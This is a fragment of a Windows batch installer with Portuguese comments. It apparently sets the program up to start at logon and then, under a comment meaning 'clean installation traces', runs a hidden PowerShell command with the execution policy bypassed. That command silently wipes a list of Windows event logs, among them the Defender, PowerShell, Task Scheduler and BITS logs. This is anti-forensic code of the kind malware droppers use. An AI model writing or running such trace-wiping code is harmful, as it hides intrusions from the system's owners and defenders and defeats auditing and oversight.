...
if %errorLevel% equ 0 (
    ...
    if %errorLevel% equ 0 (
        ...
        echo [AVISO] O programa pode nao iniciar automaticamente no logon.
    )
)
...
:: Limpar rastros de instalação (SEM VAZAR GITHUB)
...
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$logs = @('Microsoft-Windows-Eventlog/Operational', 'Setup', 'Microsoft-Windows-PowerShell/Operational', 'Microsoft-Windows-Windows Defender/Operational', 'Microsoft-Windows-TaskScheduler/Operational', 'Microsoft-Windows-Bits-Client/Operational', 'Microsoft-Windows-Diagnostics-Performance/Operational', 'Microsoft-Windows-Kernel-PnP/Configuration', 'Microsoft-Windows-WinRM/Operational', 'Microsoft-Windows-WindowsUpdateClient/Operational'); foreach ($log in $logs) { wevtutil cl $log /quiet 2>$null }; wevtutil cl 'Microsoft-Windows-Eventlog/Operational' /quiet 2>$null" >nul 2>&1
